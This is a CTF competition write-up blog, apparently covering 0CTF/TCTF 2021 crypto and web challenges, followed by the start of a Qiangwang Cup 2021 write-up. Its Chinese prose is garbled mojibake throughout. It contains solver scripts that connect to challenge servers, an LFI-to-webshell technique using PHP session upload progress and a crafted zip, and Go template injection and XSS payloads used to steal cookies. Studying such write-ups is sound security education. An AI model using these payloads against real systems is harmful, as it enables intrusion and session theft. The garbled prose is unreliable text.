æœ€åä¹Ÿå¯ä»¥å¾—åˆ° flagã€‚ WOW0Is1That2Flag3TCTF{B7UmV4x8JRHNKBCWxyevXt97tnQJtHjrZ}4God5Job Cryptocheckin Welcome to 0CTF/TCTF 2021! 111.186.59.11:16256 Nothing fancy, just do the math. è™½ç„¶æ˜¯å¤§æ•°æ±‚è§£ï¼Œä½†ç›´æ¥æ‹¿ gmpy2 æ¥ç®—å°±å®Œäº‹äº†ã€‚ from gmpy2 import mpz from pwn import * import re context.log_level = 'debug' context.timeout = 10 sh = remote('111.186.59.11', 16256) sh.recvuntil(\"Show me your computation:\\n\") x = sh.recvuntil(\" = ?\").decode() print('====&gt; x:', x) d = re.findall(r'(\\d+)\\^\\((\\d+)\\^(\\d+)\\) mod (\\d+) = \\?', x)[0] print('=====&gt; info:', d) a, b, c, p = [int(a) for a in d] result = pow(mpz(a), pow(mpz(b), mpz(c)), mpz(p)) print('=========&gt; result:', result) sh.sendlineafter(\"Your answer: \", str(result)) sh.recvall() # Here is your flag: flag{h0w_m4ny_squar3s_can_u_d0_in_10_sec0nds?} zer0lfsr- Much easier than zer0lfsr! nc 111.186.59.28 31337 not download NOTICE: the download link is updated. use the link below download æºç ï¼š #!/usr/bin/env python3 import random import signal import socketserver import string from hashlib import sha256 from os import urandom from secret import flag def _prod(L): p = 1 for x in L: p *= x return p def _sum(L): s = 0 for x in L: s ^= x return s def n2l(x, l): return list(map(int, '{{0:0{}b}}'.format(l).format(x))) class Generator1: def __init__(self, key: list): assert len(key) == 64 self.NFSR = key[: 48] self.LFSR = key[48: ] self.TAP = [0, 1, 12, 15] self.TAP2 = [[2], [5], [9], [15], [22], [26], [39], [26, 30], [5, 9], [15, 22, 26], [15, 22, 39], [9, 22, 26, 39]] self.h_IN = [2, 4, 7, 15, 27] self.h_OUT = [[1], [3], [0, 3], [0, 1, 2], [0, 2, 3], [0, 2, 4], [0, 1, 2, 4]] def g(self): x = self.NFSR return _sum(_prod(x[i] for i in j) for j in self.TAP2) def h(self): x = [self.LFSR[i] for i in self.h_IN[:-1]] + [self.NFSR[self.h_IN[-1]]] return _sum(_prod(x[i] for i in j) for j in self.h_OUT) def f(self): return _sum([self.NFSR[0], self.h()]) def clock(self): o = self.f() self.NFSR = self.NFSR[1: ] + [self.LFSR[0] ^ self.g()] self.LFSR = self.LFSR[1: ] + [_sum(self.LFSR[i] for i in self.TAP)] return o class Generator2: def __init__(self, key): assert len(key) == 64 self.NFSR = key[: 16] self.LFSR = key[16: ] self.TAP = [0, 35] self.f_IN = [0, 10, 20, 30, 40, 47] self.f_OUT = [[0, 1, 2, 3], [0, 1, 2, 4, 5], [0, 1, 2, 5], [0, 1, 2], [0, 1, 3, 4, 5], [0, 1, 3, 5], [0, 1, 3], [0, 1, 4], [0, 1, 5], [0, 2, 3, 4, 5], [ 0, 2, 3], [0, 3, 5], [1, 2, 3, 4, 5], [1, 2, 3, 4], [1, 2, 3, 5], [1, 2], [1, 3, 5], [1, 3], [1, 4], [1], [2, 4, 5], [2, 4], [2], [3, 4], [4, 5], [4], [5]] self.TAP2 = [[0, 3, 7], [1, 11, 13, 15], [2, 9]] self.h_IN = [0, 2, 4, 6, 8, 13, 14] self.h_OUT = [[0, 1, 2, 3, 4, 5], [0, 1, 2, 4, 6], [1, 3, 4]] def f(self): x = [self.LFSR[i] for i in self.f_IN] return _sum(_prod(x[i] for i in j) for j in self.f_OUT) def h(self): x = [self.NFSR[i] for i in self.h_IN] return _sum(_prod(x[i] for i in j) for j in self.h_OUT) def g(self): x = self.NFSR return _sum(_prod(x[i] for i in j) for j in self.TAP2) def clock(self): self.LFSR = self.LFSR[1: ] + [_sum(self.LFSR[i] for i in self.TAP)] self.NFSR = self.NFSR[1: ] + [self.LFSR[1] ^ self.g()] return self.f() ^ self.h() class Generator3: def __init__(self, key: list): assert len(key) == 64 self.LFSR = key self.TAP = [0, 55] self.f_IN = [0, 8, 16, 24, 32, 40, 63] self.f_OUT = [[1], [6], [0, 1, 2, 3, 4, 5], [0, 1, 2, 4, 6]] def f(self): x = [self.LFSR[i] for i in self.f_IN] return _sum(_prod(x[i] for i in j) for j in self.f_OUT) def clock(self): self.LFSR = self.LFSR[1: ] + [_sum(self.LFSR[i] for i in self.TAP)] return self.f() class zer0lfsr: def __init__(self, msk: int, t: int): if t == 1: self.g = Generator1(n2l(msk, 64)) elif t == 2: self.g = Generator2(n2l(msk, 64)) else: self.g = Generator3(n2l(msk, 64)) self.t = t def next(self): for i in range(self.t): o = self.g.clock() return o class Task(socketserver.BaseRequestHandler): def __init__(self, *args, **kargs): super().__init__(*args, **kargs) def proof_of_work(self): random.seed(urandom(8)) proof = ''.join([random.choice(string.ascii_letters + string.digits + '!#$%&amp;*-?') for _ in range(20)]) digest = sha256(proof.encode()).hexdigest() self.dosend('sha256(XXXX + {}) == {}'.format(proof[4: ], digest)) self.dosend('Give me XXXX:') x = self.request.recv(10) x = (x.strip()).decode('utf-8') if len(x) != 4 or sha256((x + proof[4: ]).encode()).hexdigest() != digest: return False return True def dosend(self, msg): try: self.request.sendall(msg.encode('latin-1') + b'\\n') except: pass def timeout_handler(self, signum, frame): raise TimeoutError def handle(self): try: signal.signal(signal.SIGALRM, self.timeout_handler) signal.alarm(30) if not self.proof_of_work(): self.dosend('You must pass the PoW!') return signal.alarm(50) available = [1, 2, 3] for _ in range(2): self.dosend('which one: ') idx = int(self.request.recv(10).strip()) assert idx in available available.remove(idx) msk = random.getrandbits(64) lfsr = zer0lfsr(msk, idx) for i in range(5): keystream = '' for j in range(1000): b = 0 for k in range(8): b = (b &lt;&lt; 1) + lfsr.next() keystream += chr(b) self.dosend('start:::' + keystream + ':::end') hint = sha256(str(msk).encode()).hexdigest() self.dosend('hint: ' + hint) self.dosend('k: ') guess = int(self.request.recv(100).strip()) if guess != msk: self.dosend('Wrong ;(') self.request.close() else: self.dosend('Good :)') self.dosend(flag) except TimeoutError: self.dosend('Timeout!') self.request.close() except: self.dosend('Wtf?') self.request.close() class ThreadedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \"__main__\": HOST, PORT = '0.0.0.0', 31337 server = ThreadedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() æ˜¯è¾£ä¸ª çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ï¼ˆLFSRï¼‰ï¼Œä½†åˆä¸æ˜¯å’±ä¹‹å‰è§è¿‡çš„é‚£ç§ã€‚ è¿™ä¸ªè²Œä¼¼å¯ä»¥ç”¨ Fast Correlation Attacksï¼ˆprojectï¼‰ã€‚ 2019 å¹´çš„ TCTF å°±å‡ºè¿‡è¿™æ ·ä¸€é¢˜ï¼Œ0CTF/TCTF 2019 Quals - zer0lfsr. ä»–é‚£é¢˜æ˜¯é™æ€çš„æ–‡ä»¶æ•°æ®ï¼Œæ²¡æœ‰å’ŒæœåŠ¡å™¨çš„äº¤äº’ï¼Œå†™èµ·æ¥æ¯”è¾ƒæ–¹ä¾¿ï¼Œæ±‚è§£ä¹Ÿå¯ä»¥ç›´æ¥æ‹¿ Z3 solver æ¥å®ç°äº†ã€‚ è¿™é¢˜çš„è¯ Generator1 å’Œ Generator3 æ¯”è¾ƒç®€å•ï¼Œç„¶è€Œç›´æ¥æ‹¿ Z3 å‘ç°æ•´ä¸é€šï¼Œä¼šæç¤º unsupported format string passed to BitVecRef.__format__ï¼Œä¹Ÿå°±æ˜¯è¯´ BitVec ä¸æ”¯æŒ format æ“ä½œã€‚ æ¯”èµ›çš„æ—¶å€™çœ‹äº†ä¸€æ™šä¸Šè¿™é¢˜ä¸çŸ¥é“å’‹æ•´ï¼Œèµ›åçœ‹äº†äººå®¶å¤§ä½¬çš„ wp æ‰å‘ç°åªéœ€è¦é‡å†™ä¸€ä¸‹ n2l å‡½æ•°å°±å®Œäº‹äº†ã€‚ æŠŠè¿™ä¸ªæ”¹æˆä½æ“ä½œï¼Œç”¨ä½ä¸ã€ç§»ä½æ“ä½œæ¥å¯¹æ¯ä¸ª BitVec è¿›è¡Œæ“ä½œï¼Œæœ€åå½¢æˆä¸€ä¸ª BitVec çš„ listã€‚ å¦å¤–åœ¨æ¥æ”¶æ•°æ®çš„å¤„ç†ä¸Šï¼Œåªéœ€è¦ç»™å‰ 200 ä½è¿™æ ·çš„ç»“æœå»ºç«‹æ–¹ç¨‹ç»„å°±èƒ½æ±‚è§£äº†ï¼Œæ²¡å¿…è¦å…¨éƒ¨åŠ ä¸Šã€‚ ï¼ˆ8000ä¸ªæ–¹ç¨‹å¤ªå¤šäº†ä¹Ÿæ²¡å¿…è¦ï¼‰ Exp å¦‚ä¸‹ã€‚ \"\"\"MiaoTony\"\"\" from pwn import * from itertools import product from string import ascii_letters, digits from hashlib import sha256 from z3 import * def _prod(L): p = 1 for x in L: p *= x return p def _sum(L): s = 0 for x in L: s ^= x return s def n2l_(x, l): return list(map(int, '{{0:0{}b}}'.format(l).format(x))) def n2l(x, l): # need to rewrite n2l with bit computation ans = [] for i in range(l): ans.append(x &amp; 1) x = x &gt;&gt; 1 return ans[::-1] class Generator1: def __init__(self, key: list): # assert len(key) == 64 self.NFSR = key[: 48] self.LFSR = key[48:] self.TAP = [0, 1, 12, 15] self.TAP2 = [[2], [5], [9], [15], [22], [26], [39], [26, 30], [ 5, 9], [15, 22, 26], [15, 22, 39], [9, 22, 26, 39]] self.h_IN = [2, 4, 7, 15, 27] self.h_OUT = [[1], [3], [0, 3], [0, 1, 2], [0, 2, 3], [0, 2, 4], [0, 1, 2, 4]] def g(self): x = self.NFSR return _sum(_prod(x[i] for i in j) for j in self.TAP2) def h(self): x = [self.LFSR[i] for i in self.h_IN[:-1]] + [self.NFSR[self.h_IN[-1]]] return _sum(_prod(x[i] for i in j) for j in self.h_OUT) def f(self): return _sum([self.NFSR[0], self.h()]) def clock(self): o = self.f() self.NFSR = self.NFSR[1:] + [self.LFSR[0] ^ self.g()] self.LFSR = self.LFSR[1:] + [_sum(self.LFSR[i] for i in self.TAP)] return o class Generator2: def __init__(self, key): # assert len(key) == 64 self.NFSR = key[: 16] self.LFSR = key[16:] self.TAP = [0, 35] self.f_IN = [0, 10, 20, 30, 40, 47] self.f_OUT = [[0, 1, 2, 3], [0, 1, 2, 4, 5], [0, 1, 2, 5], [0, 1, 2], [0, 1, 3, 4, 5], [0, 1, 3, 5], [0, 1, 3], [0, 1, 4], [0, 1, 5], [0, 2, 3, 4, 5], [ 0, 2, 3], [0, 3, 5], [1, 2, 3, 4, 5], [1, 2, 3, 4], [1, 2, 3, 5], [1, 2], [1, 3, 5], [1, 3], [1, 4], [1], [2, 4, 5], [2, 4], [2], [3, 4], [4, 5], [4], [5]] self.TAP2 = [[0, 3, 7], [1, 11, 13, 15], [2, 9]] self.h_IN = [0, 2, 4, 6, 8, 13, 14] self.h_OUT = [[0, 1, 2, 3, 4, 5], [0, 1, 2, 4, 6], [1, 3, 4]] def f(self): x = [self.LFSR[i] for i in self.f_IN] return _sum(_prod(x[i] for i in j) for j in self.f_OUT) def h(self): x = [self.NFSR[i] for i in self.h_IN] return _sum(_prod(x[i] for i in j) for j in self.h_OUT) def g(self): x = self.NFSR return _sum(_prod(x[i] for i in j) for j in self.TAP2) def clock(self): self.LFSR = self.LFSR[1:] + [_sum(self.LFSR[i] for i in self.TAP)] self.NFSR = self.NFSR[1:] + [self.LFSR[1] ^ self.g()] return self.f() ^ self.h() class Generator3: def __init__(self, key: list): # assert len(key) == 64 self.LFSR = key self.TAP = [0, 55] self.f_IN = [0, 8, 16, 24, 32, 40, 63] self.f_OUT = [[1], [6], [0, 1, 2, 3, 4, 5], [0, 1, 2, 4, 6]] def f(self): x = [self.LFSR[i] for i in self.f_IN] return _sum(_prod(x[i] for i in j) for j in self.f_OUT) def clock(self): self.LFSR = self.LFSR[1:] + [_sum(self.LFSR[i] for i in self.TAP)] return self.f() class zer0lfsr: def __init__(self, msk: int, t: int): if t == 1: self.g = Generator1(n2l(msk, 64)) elif t == 2: self.g = Generator2(n2l(msk, 64)) else: self.g = Generator3(n2l(msk, 64)) self.t = t def next(self): for i in range(self.t): o = self.g.clock() return o context.log_level = 'debug' context.timeout = 10 r = remote('111.186.59.28', 31337) rec = r.recvline().strip().decode() suffix = rec.split(\"+ \")[1].split(\")\")[0] digest = rec.split(\"== \")[1] log.info(f\"suffix: {suffix}\\ndigest: {digest}\") for comb in product(ascii_letters + digits + '!#$%&amp;*-?', repeat=4): prefix = ''.join(comb) if sha256((prefix+suffix).encode()).hexdigest() == digest: print(prefix) break else: log.info(\"PoW failed\") r.sendlineafter(b\"Give me XXXX:\", prefix.encode()) for choice in [1, 3]: r.sendlineafter(b'which one: ', str(choice)) d = '' for i in range(5): x = r.recvuntil(\":::end\\n\").strip().lstrip( b'start:::').rstrip(b':::end').decode('latin-1') d += x # print(\"=====&gt; d:\", d) r.recvuntil(\"hint: \") hint = r.recvuntil(\"\\n\").strip().decode() print(\"=====&gt; hint:\", hint) r.recvuntil('k: \\n') s = Solver() msk1 = BitVec('msk1', 64) lfsr = zer0lfsr(msk1, choice) # for i in range(5): # keystream = '' # for j in range(1000): # b = 0 # for k in range(8): # b = (b &lt;&lt; 1) + lfsr.next() # keystream += chr(b) digits = [] for x in d: x = ord(x) for i in range(8): digit = 1 if (x &amp; 0b10000000) &gt; 0 else 0 x &lt;&lt;= 1 digits.append(digit) # print(digit, x) # s.add(digit == lfsr.next()) print('[+] Receive OK!') for i in range(200): s.add(digits[i] == lfsr.next()) s.check() print(s.model()) msk = s.model()[msk1] assert sha256(str(msk).encode()).hexdigest() == hint r.sendline(str(msk)) r.interactive() flag{we_have_tried_our_best_to_prevent_the_use_of_z3} å¥½å®¶ä¼™ï¼ŒåŸæ¥æ˜¯ä½ ä»¬æ•…æ„çš„å•Šï¼Œååï¼ å¦å¤–ï¼Œå‘ç°ä¸€ä¸ªæœ‰æ„æ€çš„åœ°æ–¹ã€‚ ç”¨ latin-1 è¿›è¡Œç¼–ç ä¸ä¼šæ”¹å˜å­—ç¬¦çš„é•¿åº¦ï¼Œè€Œç”¨ utf-8 ç¼–ç å°±å¯èƒ½ä¼šä½¿å¾—é•¿åº¦å¢å¤§ã€‚ è¿™æƒ…å†µåœ¨ä¹‹å‰ä¹Ÿé‡åˆ°è¿‡ï¼Œäºæ˜¯å¤„ç†çš„æ—¶å€™å°±è¦ç‰¹åˆ«å°å¿ƒï¼Œæ­£å¥½å‘ç° 2019 TCTF zer0lfsr ä¸€é¢˜ä¹Ÿæœ‰è¿™ä¸ªæƒ…å†µã€‚ åŸå› æ˜¯è¿›è¡Œ utf-8 ç¼–ç ï¼Œå½“ chr æ“ä½œçš„æ•°å­— &lt;= 127 æ—¶å¯ä»¥æ­£å¸¸ç”¨ 1byte è¡¨ç¤ºï¼Œè€Œ python2 å¤§äº 127 ä¼šæŠ¥é”™ï¼Œpython3 ä¼šä½¿ç”¨ 2bytes è¿›è¡Œè¡¨ç¤ºã€‚ # åœ¨åŒºé—´[128, 192)å†…,æ•°å­—çš„è¡¨ç¤ºå½¢å¼ä¼šåŠ ä¸Šxc2å‰ç¼€: &gt;&gt;&gt; chr(130).encode() b'\\xc2\\x80' # åœ¨åŒºé—´[192, 255)å†…,æ•°å­—çš„è¡¨ç¤ºå½¢å¼ä¼šåŠ ä¸Šxc3å‰ç¼€,åŒæ—¶æ•°å­—æœ¬èº«å‡å»64: &gt;&gt;&gt; chr(200).encode() b'\\xc3\\x88' è§£ç è„šæœ¬ï¼š æœ€ç®€å•çš„å°±æ˜¯ç›´æ¥ä»¥ bytes éƒ½è¿›æ¥ï¼Œç›´æ¥ decode å³å¯ã€‚ # python3ç¯å¢ƒä¸‹ with open('keystream','rb') as f: data = f.read() data = data.decode() # python2ç¯å¢ƒä¸‹ import codecs with codecs.open('keystream', 'rb', 'utf8') as f: data = f.read() å¤æ‚ä¸€ç‚¹å°±æ‰‹åŠ¨æ ¹æ®å‰ç¼€æ¥è§£ç ï¼ˆå‚è€ƒç½‘ä¸Šçš„ï¼‰ #!/usr/bin/python3 b = b'' with open('keystream','rb') as f: data = f.read() i = 0 while i &lt; len(data): if data[i] == 194: b += bytes([data[i+1]]) i += 1 elif data[i] == 195: b += bytes([data[i+1] + 64]) i += 1 else: b += bytes([data[i]]) i += 1 Extensive Reading: æ·±å…¥åˆ†æCTFä¸­çš„LFSRç±»é¢˜ç›®ï¼ˆäºŒï¼‰ LFSRåŸç†åŠCTFç›¸å…³(ä¸€) CTFç«èµ›å¯†ç å­¦ ä¹‹ LFSR CTF | 2020 CISCNåˆèµ› Z3&amp;LFSR WriteUp Web1linephp http://111.186.59.2:50080 http://111.186.59.2:50081 http://111.186.59.2:50082 The three servers are the same, you can choose any one. server will be reset every 10 minutes. æºç ï¼š &lt;?php ($_=@$_GET['yxxx'].'.php') &amp;&amp; @substr(file($_)[0],0,6) === '@&lt;?php' ? include($_) : highlight_file(__FILE__) &amp;&amp; include('phpinfo.html'); è¿™é¢˜æ˜¯ HITCON2018 One Line PHP Challenge çš„å‡çº§ç‰ˆã€‚ é‚£é¢˜çš„æºç æ˜¯ ($_=@$_GET['orange']) &amp;&amp; @substr(file($_)[0],0,6) === '@&lt;?php' ? include($_) : highlight_file(__FILE__); è¿™é¢˜å…¶å®å°±æ–‡ä»¶ååŠ äº†ä¸ª .php ã€‚ å‚è€ƒ hitcon2018 One Line PHP Challenge hitcon 2018 One Line PHP Challenge åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å« phpinfo with LFI åˆ©ç”¨ PHP upload_progress è¿›è¡Œæ–‡ä»¶åŒ…å«æ¥ä¸Šä¼ æ–‡ä»¶å¹¶æ‰§è¡Œã€‚ å…ˆçœ‹ä¸€çœ‹ session ç›¸å…³çš„é…ç½®ã€‚ session.auto_start = Offï¼Œä»£ç å¦‚æœæ²¡æœ‰ session_start() ä¹Ÿæ˜¯æ²¡æœ‰å¼€å¯ session çš„ï¼Œä½†æ˜¯å¦‚æœåœ¨å¤šéƒ¨åˆ†çš„ POST æ•°æ®é‡ŒåŠ å…¥ PHP_SESSION_UPLOAD_PROGRESS å­—æ®µå°±å¯ä»¥å¼€å¯ session äº†ã€‚ session.upload_progress.cleanup = On ï¼Œæ–‡ä»¶ä¸Šä¼ åï¼Œsession æ–‡ä»¶å†…å®¹ä¼šè¢«ç«‹å³æ¸…ç©ºï¼Œäºæ˜¯è¦è¿›è¡Œæ¡ä»¶ç«äº‰ï¼Œä¼ ä¸€ä¸ªå¤§æ–‡ä»¶æ¥æ‹–æ—¶é—´ï¼Œåœ¨æ¸…ç©ºä¹‹å‰åŒ…å«è¯¥æ–‡ä»¶ã€‚ åˆ°è¿™é‡Œå°±æ˜¯ä¹‹å‰é‚£é¢˜å°±å¯ä»¥è§£äº†ã€‚ è€Œè¿™é¢˜çš„è¯ï¼Œåˆ©ç”¨ zip:// åè®®å¯ä»¥åœ¨åŒ…å«çš„æ—¶å€™åŒ…å«å‹ç¼©åŒ…é‡Œçš„æ–‡ä»¶ï¼Œè¿™æ ·å°±èƒ½åœ¨æ‹¼æ¥ .php çš„æ—¶å€™è¯»å–åˆ°éœ€è¦çš„ php æ–‡ä»¶äº†ã€‚ ç„¶è€Œè¿˜éœ€è¦ä¸€ä¸ª zip çš„ trickã€‚ ç”±äº PHP åœ¨è¿›è¡Œ zip æ–‡ä»¶è¯»å–çš„æ—¶å€™æ˜¯ä»ç»“å°¾çš„éƒ¨åˆ†è¯»åç§»é‡ï¼Œç„¶åä»å¼€å¤´+åç§»é‡çš„ä½ç½®å¼€å§‹è¯»å–ï¼Œäºæ˜¯å°±æ„é€ ä¸€ä¸ª zipï¼Œè·³è¿‡ upload_progress_ æ¥è¯»å–å°±å®Œäº‹äº†ã€‚ èµ›åå‘ç°æœ‰å¦ä¸€ç§æ–¹æ¡ˆï¼Œå°±æ˜¯å…ˆåœ¨å‹ç¼©åŒ…é‡Œæ”¾ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åé€šè¿‡å‘½ä»¤è¡Œç»™å‹ç¼©åŒ…é™„åŠ ä¸Šæ‰€éœ€çš„ php æœ¨é©¬æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™æ · phpğŸ æ‰€å­˜å‚¨çš„ä½ç½®ä¸ä¼šè¢«ç ´åæ‰ï¼Œèƒ½é€šè¿‡ php zip åè®®æ­£å¸¸è§£æã€‚ç„¶åæ‰“è¿‡å»å°±å®Œäº‹äº†ã€‚ ä¸‹é¢æ˜¯é˜Ÿå‹çš„ Writeupï¼š å¾ˆæ˜æ˜¾æ˜¯ hitcon é‚£ä¸ª oneline php ï¼Œå¤ä¹ ä¸€ä¸‹ wp ï¼Œç„¶åå‘ç°å¤šäº†ä¸€ä¸ª php åç¼€ï¼Œå¯¹äºè¿™ä¸ªç‚¹å°è¯•äº† phar/zip LFI éƒ½ä¸å¤ªè¡Œï¼Œæœ€åçœ‹ zip æ ¼å¼çš„æ—¶å€™ï¼Œå‘ç° zip æ˜¯ä»åå¾€å‰è¯»çš„ï¼Œç±»ä¼¼æŒ‡é’ˆçš„æ„é€ ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ ä¸€ä¸ª zip æ–‡ä»¶ï¼Œç„¶åä¿®æ”¹ä¸€ä¸‹ï¼Œåˆšå¥½upload_progress_æ˜¯ 16 å­—èŠ‚ï¼Œåªéœ€è¦æŠŠ zip é‚£å‡ ä¸ªæ®µçš„åç§»åŠ  16 å­—èŠ‚ï¼ŒæŒªä¸€ä¸‹å°±å¯ä»¥äº†ã€‚ ç„¶åç”¨ burp ä¸€è¾¹ç”¨zip:///tmp/sess_b#indexåŒ…å«è¿™ä¸ª zip æ–‡ä»¶ï¼Œä¸€è¾¹ç”¨ php upload progress åˆ·æ–° session ï¼Œå†™é©¬è¿›å»å°±å¯ä»¥äº†ã€‚ worldcupè¿™é¢˜æ˜¯é˜Ÿå‹å†™çš„ wpï¼Œåé¢ç¯å¢ƒå…³äº†å–µå–µå¤ç°ä¸äº†äº†ï¼ˆ åœ¨ä¿®æ”¹æ˜µç§°å¤„ç”¨/*å°è¯•å¤šè¡Œæ³¨é‡Šçš„æ—¶å€™ï¼Œå‘ç°å¾—åˆ°çš„å†…å®¹éƒ½è¢«åˆ é™¤äº†ï¼ŒçŒœæƒ³æœ‰å¯èƒ½æ˜¯æœåŠ¡ç«¯æ¸²æŸ“ï¼Œåˆå› ä¸ºæ˜¯ golang ï¼Œæœäº†ä¸€ä¸‹å‘ç°æœ‰ï¼š https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html å°è¯•å…ˆç”¨ {{.}} è¯•è¯•çœ‹ï¼Œå‘ç°åœ¨ä¸»é¡µæˆåŠŸè¾“å‡º const msg = [ { name: \"map[_nonce:ttJVZSLyh5Us2Gx1gLzALQ code:fadc1d lv:1 msg:\\u0022\\u0027*\\/`s name:zedd1]\", } ] const ParseMSG = (d) =&gt; { if (d['name'] != \"map[_nonce:ttJVZSLyh5Us2Gx1gLzALQ code:fadc1d lv:1 msg:\\u0022\\u0027*\\/`s name:zedd1]\") return `${d['name']}(quota ${d['quota'] != -1 ? d['used'] + \"/\" + d['quota'] : 'unlimited'}): ${d['msg']}`; else return `Your quota: 1, Nickname: {\"_nonce\":\"ttJVZSLyh5Us2Gx1gLzALQ\",\"code\":\"fadc1d\",\"lv\":1,\"msg\":\"\\\"'*/`s\",\"name\":\"zedd1\"}`; }; for (let i = 0; i &lt; 5; ++i) $(\"#msg\").append('&lt;div class=\"form-group row\"&gt;&lt;p&gt;' + ParseMSG(msg[i]) + '&lt;/p&gt;&lt;/div&gt;'); $(\"#newmsg\").text('(quota 1/1): \\u0022\\u0027*\\/`s'); å‘ç°åœ¨returnè¯­å¥ä¸­å¯ä»¥å°è¯•ä½¿ç”¨åå¼•å·é—­åˆï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ”¹ä¸€ä¸‹ msg çš„å†…å®¹å°±å¥½äº†ã€‚ æ”¹æˆ {\"msg\":\"`+alert()+`\"} å°±èƒ½å¼¹çª—äº†ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥å°±æ˜¯ xss äº†ï¼Œç›´æ¥window.locationè·³å°±è¡Œäº†ã€‚ æ‹¿åˆ° level1 cookie ä¹‹åï¼Œè®¿é—® level2 ï¼Œä½†æ˜¯å¥½åƒå¯ä»¥ç›´æ¥ X ï¼Œä¸çŸ¥é“è®¾ç½®çš„æ„ä¹‰åœ¨å“ª $(\"#newmsg\").text(`\"`+alert()+`\"`); æ‹¿åˆ°ä¸¤ä¸ª cookie level1=NoQWeCy70QekDB5b; level2=Autx5F53FmmSFayM è®¿é—® http://111.186.58.249:19260/casino?bet=1 ç”¨{{$}}å¯ä»¥çœ‹åˆ°å˜é‡åï¼Œç„¶åçœ‹äº†ä¸€ä¸‹ text æ¨¡æ¿æ–‡æ¡£ï¼Œä¸€å¼€å§‹ç”¨ {{if%20gt%20.o0ps_u_Do1nt_no_t1%20.o0ps_u_Do1nt_no_t2}}{{printf%201}}{{else}}{{printf%200}}{{end}} å‰ç«¯èµ¢éº»äº†ä½†æ˜¯åç«¯ä¸åŠ é’±ï¼Œç„¶åé™·å…¥è„‘æ´å½“ä¸­ã€‚ åæ¥æƒ³åˆ°å¯èƒ½æ˜¯å…ˆåŠ è½½çš„æ¨¡ç‰ˆï¼Œå†æ›´æ–°é’±ï¼Œäºæ˜¯æƒ³ä¸ªåŠæ³•æŠŠé”™çš„æ—¶å€™æå´©å°±è¡Œäº†ã€‚ 0{{if%20gt%20.o0ps_u_Do1nt_no_t1%20.o0ps_u_Do1nt_no_t2}}{{call%201}}{{end}} ç„¶åå°±å¯ä»¥ç¨³èµ¢äº†ã€‚ å°ç»“è¿™æ¯”èµ›é¢˜ç›®å¤ªéš¾äº†å•Šï¼ï¼ï¼ å–µå–µå¥½èœå•Šï¼Œå–µå‘œå‘œå‘œï¼ï¼ï¼ å“­äº†ï¼Œé˜Ÿå‹å¤§å¤šåœ¨å‡†å¤‡æœŸæœ«è€ƒè¯•ï¼Œéƒ½æ²¡ä»€ä¹ˆå¸ˆå‚…æ¥ä¸€èµ·ç©ã€‚ã€‚ æœ€ååªæ‰“åˆ°äº† RisingStar Scoreboard ç¬¬13ï¼Œç„¶è€Œå‰ 12 è¿›å†³èµ›ï¼Œå¤ªéš¾å—å•¦ï¼Œå–µå‘œå‘œå‘œï¼ æ€»æ¦œ ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/07/15/CTF_2021TCTF-0CTF/"},{"title":"CTF | 2021 å¼ºç½‘æ¯çº¿ä¸Šèµ› Web&Misc WriteUp","text":"æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼šhttps://www.anquanke.com/post/id/244824 å¼•è¨€ ç¬¬äº”å±Šå¼ºç½‘æ¯å…¨å›½ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ› - çº¿ä¸Šèµ› æ¯”èµ›æ—¶é—´: 2021-06-12 09:00 ~ 2021-06-13 21:00 æ¯”èµ›å®˜ç½‘: https://www.ichunqiu.com/2021qwb è¿™æ¯”èµ›æ—¶é•¿36hï¼ŒåŒ…æ‹¬ç­¾åˆ°å’Œé—®å·æ€»å…±43é¢˜ï¼Œå¤ªé¡¶å•¦ï¼ å¤§éƒ¨åˆ†éƒ½æ˜¯å’Œé˜Ÿé‡Œå¸ˆå‚…ä»¬ä¸€èµ·æ‰“çš„ï¼Œæœ‰äº›é¢˜ç›®è‡ªå·±çœ‹äº†å…¶ä¸­ä¸€éƒ¨åˆ†ï¼Œèµ›ååˆç¨å¾®å¤ç°äº†ä¸€ä¸‹ã€‚ Web[å¼ºç½‘å…ˆé”‹]å¯»å®æœ‰ä¸¤å…³ çº¿ç´¢1 &lt;?php header('Content-type:text/html;charset=utf-8'); error_reporting(0); highlight_file(__file__); function filter($string){ $filter_word = array('php','flag','index','KeY1lhv','source','key','eval','echo','\\$','\\(','\\.','num','html','\\/','\\,','\\'','0000000'); $filter_phrase= '/'.implode('|',$filter_word).'/'; return preg_replace($filter_phrase,'',$string); } if($ppp){ unset($ppp); } $ppp['number1'] = \"1\"; $ppp['number2'] = \"1\"; $ppp['nunber3'] = \"1\"; $ppp['number4'] = '1'; $ppp['number5'] = '1'; extract($_POST); $num1 = filter($ppp['number1']); $num2 = filter($ppp['number2']); $num3 = filter($ppp['number3']); $num4 = filter($ppp['number4']); $num5 = filter($ppp['number5']); if(isset($num1) &amp;&amp; is_numeric($num1)){ die(\"éæ•°å­—\"); } else{ if($num1 &gt; 1024){ echo \"ç¬¬ä¸€å±‚\"; if(isset($num2) &amp;&amp; strlen($num2) &lt;= 4 &amp;&amp; intval($num2 + 1) &gt; 500000){ echo \"ç¬¬äºŒå±‚\"; if(isset($num3) &amp;&amp; '4bf21cd' === substr(md5($num3),0,7)){ echo \"ç¬¬ä¸‰å±‚\"; if(!($num4 &lt; 0)&amp;&amp;($num4 == 0)&amp;&amp;($num4 &lt;= 0)&amp;&amp;(strlen($num4) &gt; 6)&amp;&amp;(strlen($num4) &lt; 8)&amp;&amp;isset($num4) ){ echo \"ç¬¬å››å±‚\"; if(!isset($num5)||(strlen($num5)==0)) die(\"no\"); $b=json_decode(@$num5); if($y = $b === NULL){ if($y === true){ echo \"ç¬¬äº”å±‚\"; include 'KeY1lhv.php'; echo $KEY1; } }else{ die(\"no\"); } }else{ die(\"no\"); } }else{ die(\"no\"); } }else{ die(\"no\"); } }else{ die(\"no111\"); } } Payload: 